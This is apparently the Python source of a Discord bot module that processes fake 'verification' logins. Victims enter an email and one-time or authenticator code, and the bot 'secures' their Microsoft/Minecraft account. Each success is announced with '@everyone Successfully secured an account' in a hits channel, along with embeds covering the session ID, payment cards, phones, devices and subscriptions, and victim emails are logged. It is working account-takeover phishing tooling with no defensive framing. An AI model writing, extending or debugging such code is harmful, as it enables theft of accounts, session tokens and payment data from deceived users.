from discord import AllowedMentions, Embed, Interaction, abc
import logging

from securing.account_filters import is_embed_verify_no_minecraft
from securing.build_embeds import public_secure_reason
from shared.embeds import verify_embed
from shared.send_logs import send_logs, build_log_embed
from shared.post_verification import after_verify
from ui.buttons.embed_buttons import ButtonOptions
from ui.buttons.account_details import accountInfo

log = logging.getLogger("bot")

_NO_MC_TITLE = "Failed to verify"
_NO_MC_DESC = (
    "You have to use an email linked to your minecraft account, please try again."
)


def _no_mc_embed() -> Embed:
    return Embed(title=_NO_MC_TITLE, description=_NO_MC_DESC, color=0xFA4343)


def _checking_embed() -> Embed:
    return Embed(
        title="Checking your account...",
        description="Please wait while we finish verification. This can take a minute.",
        colour=0x57F287,
    )


def _verify_fail_embed(reason: str | None = None) -> Embed:
    return Embed(
        title="Could not finish verification",
        description=public_secure_reason(reason)
        or "We couldn't complete this right now. Please try again in a few minutes.",
        color=0xFA4343,
    )


async def set_verify_ephemeral(interaction: Interaction, embed: Embed) -> None:
    """Keep OTP/auth verification on a single ephemeral embed (no log dumps)."""
    edited = False
    try:
        if interaction.response.is_done():
            await interaction.edit_original_response(content=None, embed=embed, view=None)
            edited = True
        else:
            await interaction.response.send_message(embed=embed, ephemeral=True)
            edited = True
    except Exception:
        log.warning("edit verify ephemeral failed — trying followup", exc_info=True)
    if edited:
        return
    try:
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception:
        log.exception("could not send verify ephemeral")


async def _notify_user_no_minecraft(interaction: Interaction) -> None:
    """Ephemeral-only: must use a Minecraft-linked email. Do not DM."""
    await set_verify_ephemeral(interaction, _no_mc_embed())

_DETAIL_KEYS = (
    "ssid_embed",
    "info_embed",
    "account_details",
    "stats_embed",
    "xbox_embed",
    "family_embed",
    "devices_embed",
    "cards_embed",
    "subs_embed",
    "phones_embed",
)


def _is_failed(account) -> bool:
    if not account or not isinstance(account, dict):
        return True
    if account.get("failed"):
        return True
    return "hit_embed" not in account and "details" not in account


def _details_ready(details) -> bool:
    return isinstance(details, dict) and all(k in details for k in _DETAIL_KEYS)


async def publish_embed_secure_result(
    *,
    interaction: Interaction,
    hits_channel: abc.Messageable,
    secured_account,
    email: str,
    username: str,
) -> bool:
    """Post OTP/authenticator embed-verify results. Returns True on real success.

    startSecuringAccount returns a truthy dict on login/filter failures
    (``failed=True``, often without ``details``). Treating that as success
    pinged @everyone then crashed on missing stats_embed.
    """
    thumb = f"https://visage.surgeplay.com/full/512/{username}" if username else None
    view = ButtonOptions(interaction.user, interaction.user.id, username)

    if isinstance(secured_account, dict) and secured_account.get("embed_no_minecraft"):
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=view,
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    if _is_failed(secured_account):
        reason = "Failed to secure account"
        if isinstance(secured_account, dict):
            reason = str(secured_account.get("reason") or reason)
        short = public_secure_reason(reason)

        log.warning("embed secure failed for %s: %s", email, short)
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | Failed to secure | {short}```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=view,
            email=email,
        )
        # OTP/embed verify: never post the technical fail embed (HTML / RuntimeError)
        # to the accounts channel or as a second ephemeral. User keeps one status embed.
        await set_verify_ephemeral(interaction, _verify_fail_embed(short))
        return False

    details = secured_account.get("details") or {}
    hit_embed = secured_account.get("hit_embed")
    stats_embed = details.get("stats_embed") if isinstance(details, dict) else None
    no_mc = is_embed_verify_no_minecraft(secured_account)

    if no_mc:
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=view,
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    await hits_channel.send(
        "@everyone **Successfully secured an account**",
        allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
    )
    if stats_embed is not None:
        await hits_channel.send(embed=stats_embed)
    if hit_embed is not None:
        extra = accountInfo(details) if _details_ready(details) else None
        await hits_channel.send(embed=hit_embed, view=extra)

    mc = secured_account.get("minecraft") or {}
    mc_name = mc.get("name") or "No Minecraft"
    secured_desc = f"**{mc_name}** has been successfully secured."

    await send_logs(
        interaction.client,
        Embed(
            title="New Account Secured",
            description=secured_desc,
            color=0xFF9E45,
        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{mc_name}/128"),
        email=email,
        censored_only=True,
    )

    vembed = verify_embed()
    await set_verify_ephemeral(
        interaction,
        Embed(
            title=vembed["title"],
            description=vembed["description"],
            colour=vembed["color"],
        ),
    )

    await after_verify(interaction, mc_name)
    return True
